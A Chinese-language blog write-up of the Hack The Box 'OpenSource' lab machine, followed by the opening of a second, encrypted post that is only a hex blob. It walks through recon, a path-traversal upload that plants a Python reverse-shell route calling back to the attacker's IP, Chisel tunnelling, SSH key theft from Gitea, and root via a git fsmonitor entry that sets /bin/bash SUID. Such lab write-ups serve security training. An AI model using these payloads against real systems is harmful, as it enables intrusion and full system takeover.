    <content><![CDATA[<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a class="link"   href="https://blog.csdn.net/Purpose_7/article/details/128707843" >https://blog.csdn.net/Purpose_7/article/details/128707843<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://medium.com/@joemcfarland/hack-the-box-opensource-writeup-96d1671b8d78" >https://medium.com/@joemcfarland/hack-the-box-opensource-writeup-96d1671b8d78<i class="fas fa-external-link-alt"></i></a></p>
<p>官方wp</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─# nmap -A -p- --min-rate=1000 -T4 10.10.11.164  </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-11 03:49 PDT</span><br><span class="line">Warning: 10.10.11.164 giving up on port because retransmission cap hit (6).</span><br><span class="line">Stats: 0:04:34 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan</span><br><span class="line">Service scan Timing: About 50.00% done; ETC: 03:55 (0:01:25 remaining)</span><br><span class="line">Nmap scan report for 10.10.11.164</span><br><span class="line">Host is up (0.51s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT     STATE    SERVICE VERSION</span><br><span class="line">22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)</span><br><span class="line">|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)</span><br><span class="line">|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)</span><br><span class="line">80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3</span><br><span class="line">|_http-server-header: Werkzeug/2.1.2 Python/3.10.3</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     Server: Werkzeug/2.1.2 Python/3.10.3</span><br><span class="line">|     Date: Wed, 11 Sep 2024 10:42:24 GMT</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Content-Length: 5316</span><br><span class="line">|     Connection: close</span><br><span class="line">|     &lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">。。。</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;h1&gt;Error response&lt;/h1&gt;</span><br><span class="line">|     &lt;p&gt;Error code: 400&lt;/p&gt;</span><br><span class="line">|     &lt;p&gt;Message: Bad request version (&#x27;RTSP/1.0&#x27;).&lt;/p&gt;</span><br><span class="line">|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|_    &lt;/html&gt;</span><br><span class="line">|_http-title: upcloud - Upload files for Free!</span><br><span class="line">3000/tcp filtered ppp</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port80-TCP:V=7.94SVN%I=7%D=9/11%Time=66E1767F%P=aarch64-unknown-linux-g</span><br><span class="line">SF:nu%r(GetRequest,1573,&quot;HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.</span><br><span class="line">。。。</span><br><span class="line">OS:164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 993/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   554.57 ms 10.10.16.1</span><br><span class="line">2   391.34 ms 10.10.11.164</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 357.94 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先看80端口，有一个&#x2F;upcloud，&#x2F;download和&#x2F;uploads，看到是flask的，所以在上传点没考虑php。上传py文件后访问服务器没有运行，不考虑。前面nmap扫到一个应用版本<code>Werkzeug/2.1.2</code>没有看到明显可以用的漏洞，不考虑。直接访问&#x2F;console需要pin码，没有看到。</p>
<p>来到&#x2F;download，自动下载一个soucre.zip，解压看看，有个git文件</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911190158.png" ></p>
<p>看到git 日志，注意到指向了public分支，看看有没有别的分支</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911190228.png" ></p>
<p>可以看到有个dev，切换过去，有新的log</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Downloads/source]</span><br><span class="line">└─# git branch</span><br><span class="line">  dev</span><br><span class="line">* public</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/home/kali/Downloads/source]</span><br><span class="line">└─# git checkout dev                                                                                  </span><br><span class="line">Already on &#x27;dev&#x27;</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Downloads/source]</span><br><span class="line">└─# git log         </span><br><span class="line">commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (HEAD -&gt; dev, switch)</span><br><span class="line">Author: gituser &lt;gituser@local&gt;</span><br><span class="line">Date:   Thu Apr 28 13:47:24 2022 +0200</span><br><span class="line"></span><br><span class="line">    ease testing</span><br><span class="line"></span><br><span class="line">commit be4da71987bbbc8fae7c961fb2de01ebd0be1997</span><br><span class="line">Author: gituser &lt;gituser@local&gt;</span><br><span class="line">Date:   Thu Apr 28 13:46:54 2022 +0200</span><br><span class="line"></span><br><span class="line">    added gitignore</span><br><span class="line"></span><br><span class="line">commit a76f8f75f7a4a12b706b0cf9c983796fa1985820</span><br><span class="line">Author: gituser &lt;gituser@local&gt;</span><br><span class="line">Date:   Thu Apr 28 13:46:16 2022 +0200</span><br><span class="line"></span><br><span class="line">    updated</span><br><span class="line"></span><br><span class="line">commit ee9d9f1ef9156c787d53074493e39ae364cd1e05</span><br><span class="line">Author: gituser &lt;gituser@local&gt;</span><br><span class="line">Date:   Thu Apr 28 13:45:17 2022 +0200</span><br><span class="line"></span><br><span class="line">    initial</span><br></pre></td></tr></table></figure>

<p>翻找了一下能够看到dev01用户的密码，直接拿去登陆ssh，尝试失败</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911190732.png" ></p>
<h4 id="立足点"><a href="#立足点" class="headerlink" title="立足点"></a>立足点</h4><p>看一下source其他文件，在source&#x2F;app&#x2F;app&#x2F;views.py，看到文件上传的逻辑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upcloud&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        f = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        file_name = get_file_name(f.filename)</span><br><span class="line">        file_path = os.path.join(os.getcwd(), <span class="string">&quot;public&quot;</span>, <span class="string">&quot;uploads&quot;</span>, file_name)</span><br><span class="line">        f.save(file_path)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;success.html&#x27;</span>, file_url=request.host_url + <span class="string">&quot;uploads/&quot;</span> + file_name)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/uploads/&lt;path:path&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_report</span>(<span class="params">path</span>):</span><br><span class="line">    path = get_file_name(path)</span><br><span class="line">    <span class="keyword">return</span> send_file(os.path.join(os.getcwd(), <span class="string">&quot;public&quot;</span>, <span class="string">&quot;uploads&quot;</span>, path))</span><br></pre></td></tr></table></figure>

<p>看别的wp说是os.path.john，没有过滤直接拼接了，<strong>如果在文件名中插入斜杠字符，则不会考虑路径的其余部分</strong></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911191354.png"  alt="官方wp演示"></p>
<p>所以我们利用这一点，把文件名改为&#x2F;app&#x2F;app&#x2F;views.py，替换原来的views.py(抓包实现)，在里面写入新的功能拿到shell</p>
<p>在新的views.py里面增加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@app.route(&#x27;/revshell/&lt;ip&gt;&#x27;)</span><br><span class="line">def rev_shell(ip):</span><br><span class="line">    import socket,os,pty</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.connect((ip,1234))</span><br><span class="line">    os.dup2(s.fileno(),0)</span><br><span class="line">    os.dup2(s.fileno(),1)</span><br><span class="line">    os.dup2(s.fileno(),2)</span><br><span class="line">    pty.spawn(&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure>

<p>抓包改文件名上传</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911191929.png" ></p>
<p>本地开启监听，然后访问<code>10.10.11.164/revshell/10.10.16.2</code>，拿到shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911192102.png" ></p>
<h4 id="拿到user"><a href="#拿到user" class="headerlink" title="拿到user"></a>拿到user</h4><p>又看到.dockerenv文件，可以确定是在docker里面，上传一个fscan扫描，看到开了几个ip，本地curl内容都差不多</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911193125.png" ></p>
<p>访问（wget）这几个ip都是和之前直接访问80端口一样的内容。除了172.17.0.1，有个3000端口，是个gitea，尝试搭建个隧道转发出来</p>
<p>这里用到<a class="link"   href="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html" >chisel<i class="fas fa-external-link-alt"></i></a>搭建，在kali上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# ./chisel_1.10.0_linux_arm64 server -p 8000 --reverse</span><br><span class="line">2024/09/11 04:54:47 server: Reverse tunnelling enabled</span><br><span class="line">2024/09/11 04:54:47 server: Fingerprint TolIpzRv4g1qkoHO0zNMWbtOoAgYjXKucuJrFsfNvBE=</span><br><span class="line">2024/09/11 04:54:47 server: Listening on http://0.0.0.0:8000</span><br></pre></td></tr></table></figure>

<p>靶机上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/tmp # ./chisel_1.10.0_linux_amd64 client 10.10.16.2:8000 R:3000:172.17.0.1:3000</span><br><span class="line">./chisel_1.10.0_linux_amd64 client 10.10.14.6:8000 R:3000:172.17.0.1:3000</span><br><span class="line">2024/09/11 11:47:02 client: Connecting to ws://10.10.14.6:8000</span><br></pre></td></tr></table></figure>

<p>然后kali访问127.0.0.1:3000，就能看到gitea，然后之前在git里找到一个dev01的账号密码，这个时候就能派上用场了</p>
<p>登陆后在仓储里看到.ssh目录，可以直接读取id_rsa，复制保存到本地，直接登录了，拿到了dev01的shell</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>拿到后一番搜寻，没什么发现，上传一个pspy64并运行</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911200759.png" ></p>
<p>有一个&#x2F;bin&#x2F;bash &#x2F;usr&#x2F;local&#x2F;bin&#x2F;git-sync（有点难发现），查看内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dev01@opensource:/tmp$ cat /usr/local/bin/git-sync</span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">cd /home/dev01/</span><br><span class="line"></span><br><span class="line">if ! git status --porcelain; then</span><br><span class="line">    echo &quot;No changes&quot;</span><br><span class="line">else</span><br><span class="line">    day=$(date +&#x27;%Y-%m-%d&#x27;)</span><br><span class="line">    echo &quot;Changes detected, pushing..&quot;</span><br><span class="line">    git add .</span><br><span class="line">    git commit -m &quot;Backup for $&#123;day&#125;&quot;</span><br><span class="line">    git push origin main</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>主要是在git配置dev01的家目录，根据官方wp思路，我们可以修改git的配置文件，这样就能间接地利用root权限执行我们想干的事</p>
<p>在~&#x2F;.git&#x2F;config中写入 <code>fsmonitor = &quot;chmod 4755 /bin/bash&quot;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dev01@opensource:~/.git$ nano config </span><br><span class="line">dev01@opensource:~/.git$ cat config </span><br><span class="line">[core]</span><br><span class="line">        repositoryformatversion = 0</span><br><span class="line">        filemode = true</span><br><span class="line">        bare = false</span><br><span class="line">        logallrefupdates = true</span><br><span class="line">        fsmonitor = &quot;chmod 4755 /bin/bash&quot;</span><br><span class="line">[remote &quot;origin&quot;]</span><br><span class="line">        url = http://opensource.htb:3000/dev01/home-backup.git</span><br><span class="line">        fetch = +refs/heads/*:refs/remotes/origin/*</span><br><span class="line">[branch &quot;main&quot;]</span><br><span class="line">        remote = origin</span><br><span class="line">        merge = refs/heads/main</span><br></pre></td></tr></table></figure>

<p>然后等待一会，再bash -p就能拿到root</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>虽然是easy的靶机，还是相当有特点啊，不愧是htb（，其实多数都是参考来的思路，还是希望自己有耐心一直去探索思路直到成功</p>
<p>第一次接触隧道搭建，需要好好吃透这个原理，还有docker找主机网关的部分也不是很理解，而且网上的wp各有各的解释（，好的部分是帮我复习了一下git的使用吧，还是要继续加油，沉下心。</p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>linux</tag>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>htb-Trickster笔记</title>
    <url>/2024/12/29/htb-Trickster%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="2191b6d4d979a8baffb9cba3afe98454ecccdc16c7dee06912a77231cd88e548">948d3a4d19e8bce16b53ccf2f5ad6f1ad9648001e4616edc3e78dd20fe195f8fd505e69ab29795db19e929d73053c261b53ef03d8aeef60ed3da63b5997b84e0d0e8d07983417720035a719cff2643b0ef978a55189ceb7841435d42ebc1dce5c577d3e409369b7ff54774d26f3a4cfcc399e61402fb12b41314324769cba525c5c550183c0294452e1d0d18332b7bf3b67664ba9be2dc065bc94bec01ebdc511388163b55a1ae244819b5021a455f4b75b7de1a7e0a74be347309ab7b27e8921db36e2d69ab72b1f5289207c3cdf591cd930b23994ddfa533d0aa7a19eb9552c7c3c9363ee760846b7999dc4c7fa88a49b29f0ce2b6c3e040ac6a54c424bb1ef4f67ecc3b333bfbf0aa42490b0ddcb21126e3b80f3c2ed70f5d17a6e8921a670400a2fbf72ddfd6036a7b43a29247c1e6a2ebc918af656c64064fa575268d6ac2e76cb41f5cc5ecff6e341077201371eb4cc00c577da5e2e73a500a8fd504fd6704cf6eee5b37e3917e7d6614fb69294e5845bc2e8e19f19b6cf598e78c5ab13d17e1cdc41698ca3adb0487c1bab6d2c529d69d73a4142c514c024140e0a6d81cbaeee933a022004b0ce3c68fdedccaee99d2c0e8ea986305c3a04ab0bf52f07fd172e87b663002118c2553922dbb83a023190fac9263922b85d102accbd8f5d8026b2a5e259cd6212cc55225ecc1701d45d7323f784e48cab71ce65e875b998e1167383dc5a3313895c0f26763cac7336749a518ad888fe60e4038652bea953d11f4c2f5082b57cb9ad3b33daff10aa43e17e8119ce25912eb89885acbd16f88f644b7fc8f97ff7778dff9cd9addc5f6cd55b195c48dae63d9673859927df5f8123af189068bcc1050b57fcd652581241dcfa1ad431a88ee928edaabf43fff58050b764dbb55c845faf4ea5e46a1f3702543741ea0fde7dfabb90eca0258d07b188775c84beb2b0e289842af95cd238574333cdbf2060a2d5050e68c06f665fe465b3f2ae54ecfdc289d7db16b5013a9a8c7cd30fc825f4438303b971c6766da3ab518b82f36a1bc84cfe8061b3d6ef73c53dad0637584dca1291994bbc54cd1ab679abd3a8fa3b35fc09bab6ff1e28c70666bf46f446c56128d3163204bc43b1bfc1dc316801991bc1f30f714de9e6573beede0a9765469d5b4f0413b73b5d775559ce4cda8956b2075d861039217f5fdc49d1d1876efc719b89c6ffb2cb1d26aebfcb4b596124c2fee1a650333679675ef2d39780785d8cf8312444ad6b3bbd7f15987d9e7cb91954c06d9aa1ef6052ce8a6ecfc8a8fe5635e3712682245e0be009657ac9c6b3f24a1d9fb346191a1f8a6aa56c1c7152c6c94cbf9fb0f3a666bb8c38f5775a1c67937d985f455170ad71c99046cfb752412514ea6fca1edf1b2ca2cbe5947107682462aa4f61e912fb9f72844fc9651f5757a5c35667c5051c11aa01431f6433b26d439f5b4344ae6c8bd0fa654063738d068ae681bad3a243863725e5bf85f492ae171ce183fd8fa9086fcc62c1d0ad50230639b16d24055a0379b5fc67c09d8d2e4687291cda6c59913e639237a07e46082e01b380d3bae4ca2e8c88fee18a626fd2df377d0ed3ba77e15fc51e1b582956d70db2a6f26fbc1a35fcfbc17801dc21f31b1ef1e74be6af00eeb47392ce78c12fe78c0b88dcbc24071a607fe1a066c11d46ee6576f497a3bdaba22089e5336bf000bcbbc0ac7ee34ad78ace4fe9801f4d8c3265e8984c3aa3a94fd9458a277b0a70cf3874aa866840327b87a9331ad16e3d4c4cde158507815ee79176d16db7d1ae7cb041ed2d1315e429dbbf17b98591d9c41d75f2e46ad700bd0497c4632c2cfdeacbe74087739dca5cefd019b1938193cbf7d297eafc08e724a36f675328a07c3e56cae12c3db634cc07ebae02a8276973892c305a997d15782bbe3e49eb89130c1aff6b2c0869cdd24770aa80bf9446d9a34d8c7b1c296c6dbb88a8874691a45c5748cc389243fd8fde59166603dcc3f0f364326d752f795e946ab69bb2d95a6c74150183683c2873cf67e72e24841f0c74643c90d62af912e00045210120aff787620512b4284f01a8726a590f07aa634ff03576dc5fa5ae0b3b69adf195020fd2a0cf7980b6b9959877d498cce6a030980de5698b39fb0a96e454851cc2b32c686a25db274e427ba55cfaa225b357ecddc3284a53b8721dd2ff6a552a90d377de382e226f687f4e559eb6c84c1e9d9a1a60beeb69e77547f2ffeb70fd1fd56370ed5aca9adcf8b03274890d4972d8cbd7dad7aa9b6a52bf9ada33c44605ddaae2aaa7e1c8eec3a0cb062041fab9a271f13d445eeec5d26ab905e9fe933e3971c618a6dfc4d96a2fea4eea8fe0feecdab9da8b015a20c69359e284c27d67316e56879ecc259a71caf41c028659faec248c027687081933045e1d378b87132fa7f15f142025f5bcd257ba763069e24e002246858302ec2dbd859ba502c90da8cf1424d11ed218b7f7c5bd3a1cc4958bbba995fc2d22610c6aa327355d0ef34d49fa4a03e5814e5989995c69899b36daa4b61fe0615a653188341da50c5e1077251128e44616ce4d0839dd577faae32953c80b4181083ab3f59720f984e0ea569ce4edd8220206f18bae42d66865372f92e4a45f295c049e4b8575e4a81e220b5dd4bd96b592545af390718805563a9a3031b1e842345e2024fd04fa09b26ffed45830c19cb6be53e251bef6c2c4f7e6d9e416e590d87bd31cea5e52735bbb1439c77960f475e2846c8a6803633ac21016abe1efa3b13d1788d6b86f1fe941475b88a0d2d3353b2efc0d0f3ccf52e7d54b353edddfd101568321b0910ce8f312761594056a506548963efbe30f65f0ebd43be1ea9838bd5c25af3c53f53e4a23b72d4c1341f48769798ede182d0f679ab8c7cd847aabf781af84fc4ec8551ba1ec3000544ea8f1ff038565f3700af80e980e46c392a0601a075509fcc9f08dd335b7dd647dd12da4d7812bacf7e09b91c2a22d696d6de62d61e2910bbcb34eb919b567817e34fdec80a15766dafd69967da9222e3f8f29ab6a125e22718951c57402483195d008fba2615e03bfd8c5ba77c8be55ce6f2d39142237e25d40cb53da0d7d18f633c4feec1e688476667f81ad3d1aea36da156c2223b754580fc1865146e18342599420d2945f288d18171f67cdf59f987bdca8fc7a07910aa0d5eb2a767f778398307db0d61b4e5391b372bb8a7cdfc536cf6231abd5af3a2d10d81a570259c31f8195c1ecacba5b0d589eee69f2271ac81a9fd7306b388c0b75c1b5fed15ca13234b2521f2e6eb2fac62d06f4a70ce48f53d68463788fc1b4d2cb0aeaed9b1ae639d2d60d03a31111efd59c4c02bdb4eaf566c4d5dbaaf1646cb18d511f3f63b43efb29b262a13c9f47a1e808fe90da037751dc845d48ca7dfd533aae6f4e1c3661e45bfa78b87161a3f343b31a0c5ecf0c50df7c38b47bd5606a417bb017bd6596765cc6359f69f4e2e3b7d5ad46d619025f76d280c8855e9901c16e5bdbbfa186c872880b4e69dc27e13beff495b8bb8e5d63d83507c82f0c351471534d7af443d6ea471d24d1367f57c654a4c21f07cb6e66f6de87ac9174cb01e792b6eddd08789a28905dee2d8b47d59741b2dd800711d0da816c2dc5db9ba736c3629a9e1f7ab57cceec01ef4b171c8cad76638c08e118c1a96c8a5c19edf70c3d591d3da711f498a4591da7a565bf7c9502b1282b334e110b860fd8863a67684f6aec141b130bec1a5e050e40a822f1c627b38fca660855af90343ebea79f60b0355cfc3758a66bbf8b4954534f09df8a67277c03b23a655b41a2db06f44fd73a6c3f6945e3d6d06f0ce38d0a02a4eda934c5a1d3833062b88e8d3ed1ac18c0eeb93957cc320839f247767d13c6eebd9e4ad500fb4414be13c84cc89e49336e0eb16953472885e4044a8392bb6cd0dab58ed7d29c670e9911a0d4c5863f47e968cfb04d8e54ddd01454f2376fb2bf5fa9a75e55ad764e1155cb1d2457991055ee210918a9dd01a1c334600fc97b3a5dc44d6cabdeda93021c5868cc66f7934a40877a7f22e1c0a83432a478e382c290fecf758e34d1858d2d6aaa53ad824099dfda7cb2185aec74a244fa75b64d92256513a6bfa9d92711e2a97a651cf322b8bab749f9a30a9464c31133dbfa83defc296185c5070b4eba79400ae5aeb87e6d8ba1e84a0c94c107a980077c0333b7d66d28c668f548b71a1859f1e74681bcb9bdd9f3d8af3e4c927436ce780f25ae5d7ae00b314407dc602fc8295bfd00593cdf731a92287f78db76845bb0909e8de5385ca128ff136469796be119851dec0f17ddf971b533a8be0b2514d0e50309755c943d0cf9290a3045b70168c8b27a4da45c7a4bd2ffe6419093e36d4c29d7d953b05eb31799fdbc7a17a2c3c0c5304ffb295317330469c287682b28750acded27f49ef00b829ac26cb1f3a51044255a08fd3743d4f55226efea224c1796ee743c2f1a8d65009d11be6a51428dedca3fb5948ffa050e4ae830efd7fd1ec72a5ec4bc400b7bcb18c6b8baa09f99e3cd393ceb61a9e2b418eca2c712b6db06efcb08adaa1db049ea54e64535f044773d3509596c0e18b532fa3200c84dcc33af247defe4f24934cec186c68c8b3e8c89c4638cb9156449fca53bb171125db4d9606a30da6e88abb0d4c3fd77847db18ed5ab5fd88335249155a96fcf3a1a3b0806df65a15b3a41059d49e969bcba4a6bbf14fa4f7a4f76a0d71c898fae8937ebe3a061abbc79c57a72ede86bd3259736abe80c75723f4666cb4cae6bcd6a38291ec374bd02d978eb1d9c597db26788c683243eab2ea80f4194ac0dc6e3a78e752f06b451fbf83343584a19f2cf0f52395dbd912d529c0614f42c4033a070aca2d6495bfe250a96bcd32a2b617e46b4ef601f263b91b11eb4a335fa49c6c1ccdde9a7567021bb3eaadf0b6c8562cf3a64ace057633ac471a1036ed9dc6344da57e0590390edbab5f861c60a72662a8d01744f257d92c7ae82cf3ad0798870b249424c434b99a52b7116cb9404c3f6779ad47536c7c954745e5a08604f43da7fc19dd05bc55e6b5c50e52d9ea88d8ac58f19968d1458745cd4bccb9d30317b1e7a48cab763938c7a423e9683bd6bd5493dc1befdbb30a2f29573aa40a64513ef4e3076bc2803c633a6b08c749428186fcbbdebe7a4dab3e4ca55357ac694885c9983728770b0a5d0efd8b02fd88d9fed8a54ab43f43753a4df90273101b6e583d11a32e696a1f722f172406c443cb603bf508981f5dd3818238817aa53b008abb467d4ab19bef85714478ba3ed780f6ce1edf18ffa214c4ec8272713531c84623445ee26c7fbf6879e22bb8eb522d73f681a463015e1c57f1ff191d3279bcd71909e018164e7024f20df44159a050549fee5168be1339987c4fde51faa3447498c9efb3bf9ce22c9f01cc35752930afe06f471c2c85462dc62b43213b5023a935e9719479855f34619a1e77fe85fcd50846731a1cda17b9195551e0dd39e3379ef899287f7c53be68783f1de8f7dd5eb3046d1024c319bfdf00ab442d60ed5b46094647b03289d8d94a495b22bdb85d404b759f360f19006840f8811ff0216b80fada570ec98f640683577a142ee9dfb74e601feffc060b7d5fcdd7f49fab98804eb29f5b2fb44aec1c0f0f81271c4d68b6839e8be6a4a11b237d892a11b6b453e8040ece8c79a23d879d435537cfb933e1c89e5d40f2e921a4db1cc4eb6fc8630a05bd41e16d1fe46b13fa7e55560c9694e1231ad3c0577668525129bab553f807660f47259199db3b1f97473707dce742df4f375412e00bdcc8ab63ba2767d88ed128b0bc4b0e8e4bd134e1bc69279bbafb81cbffc3d0ae305cf864c127faa0abf1c2952600abc058a43f588aa38952809341fc71256f88e9dc8c8cd27fed6232170e63bfb6b3d64459f10d91929e77463771bf35dd6f5efcdd8b4f8a8e85c57604c6bb772772527328b1cb98aa55ff45783fe49a55a3d7a4880234318f1ae8f051b6b503bab4c48ed50bad6921a5e2308da7b658b088624503bfe482fb0f20cae33f5cda6e8d598373a310c54205282c76d6172dcfee7640c5bc39b9a753acb37634d2c26a4eeb2659f8b3a04bf36fbdd3ba3dcdb105baeb938dfe37686873f4968b0790d8e68c443a905fef498974879582b668542b5166ca4964b4340245538ce9ccab3e4178a9d1ddf029329de4e57ec18a43ca6cb345785ecee93fe3e6d3b10b1b2e5598446bfc064f67cc178479f8da7eedb07779118c819bcb819a5118f360e51c921f1b84bdfcf93e1a7e32021942b93a61c0266a8e823d0de57f2cbb5f72d300df49144a61b388bcd7c7040fd598997c5a3b4b4a10ad23975168485c758d5053f2685fdf3e1faf85d9ed9b70f051a17f7cfd4c489154570732600b9d019dfef53504d965e486ac26f324071756c83e0cae8dbcb3db0d293f236f9ad90252c72f3c7fd50db4f3811e3aede3e2444faccc5dd26aec357d81d9c4f354ac4e92f72d90cd360cb49c007e107c1b6d4fda4976da65f00dd045abcec966c2c31d45deecba19e0ad446606f35f72604de012f88f3f39ff0036b61e70934ac863bc04d425ec78cfa0895c39b64620669de19bfb17ebbafc25e57ef37eb7b606cdedfa7a480e1f96049da49974c90bd5dce98fd782f503ae7feb1c09cd0470709cc536ceea2b8bdb4ab79d7aa8890a721cd449860a73cefdf74440fb2085f0d09347c1548615d2a45a5e6eca6e6a914e1016201051b1bc56bd7f20ba42d14c0d8a041c04af15d9bba460feb4ab5d8b9d9ae27619b7315dceb74a0b6ef8dc50e306da2c966c7f976781dd930dab96e004271e5baac151c74530386b4868a87f1f10151c320842c751e93e02db826fab9f2c8f7d92af1799fc96f915555d2e644944ba43eb45a4958d53cf2a297a22826a58773aa3d46940d6f91babcf26d1257d1a305a2927d7429a494668e177d91c7eae399a8e4ad136ea5e552ebcb303a89e79eda969e4ed252cec9f0da3e70cb1702d2c691b070d75a5afc545977cede488077a57032cd34436574331b9632f141bbd9b07f9e0941b1d5d1eb1224ce3dd06efffe308abae78a4e3174edeed5dfcead9b2fa75c194f78c87b8ef590cb0ed9aac69e5eefcfb9380aaeacd65c9aff22568bdf9e70199706a304987c5c608ac57ea6e5cf763a2cc98ea31a7d3e51c54e576ebcc0cec083e0073b14b96a4582f8574a138ba48361b0a12f8d4aac2403b6d6520624e078b5de3d91b2e4a038bade7231478d8824520e3ea6cf77c2e97f9aa1dafd2a771e1cc8ea0cbe416d737bc62c1d70e3f77687aa164314a30b013db0611684ec309db429fac1a18c356d8aab787c071ea11283a12474c663483498c81960338668a4dc9b786586d10f2ea9b561026f36051e03106c4a14c12feffba01f5a42ccbead7d5cd549628ab26e84982b7ec0d146561f55784306682d3318982aaabce9a4d0d401a40deae38a4c3c7b11520b63cf78d72c641f6f73136c8d68efea18992d2905cca849057e353228ddcecec2b03ca3ec88f5ed33d5f599c3ee12d9f51422a85c7906e83efc982570834f316d85184d1ccb44cf0214549bdd7490d1affb3f4f1b8ff13adf164e7e97807c258e9bef0d4aa5ba8c1984ee605d5ae33ad459978c419e149c0cc84dd6580a2720cbb4b80026fcc2620a6e2d07426e518f41b86dc240485920403657ceeba2f6d2094d96082645c29ceb7877d1c1f24bf665863b66a7b5ab19e370ef20627b41fb02754f7143b5e147f46b7fef5a313c0131b2defa23443733aa4f081e56764b6c5aa35576d83fd26f1bc1e45b7b9cb77c1d6aa34bf781b3417dc1739a6ddc5d299dea31e3bf8cb1daebb92f3022f09ed5d4d3af111a862b0d0be81906a3aff1f3bc9fce05bb366f3976430359b182c8c87dc0e207f24be9f97f64afd0938b8ec3e19c98bd7c5f3934a5f2786d8ea1dbc1a7d048cb43b6c320b7f47b23260587671a38abe76fdf25c1dd3434b195e60bf70b836bfb7c11d596d6e6ee22d3d3e3865cee6cabaaf89735688cbfc2b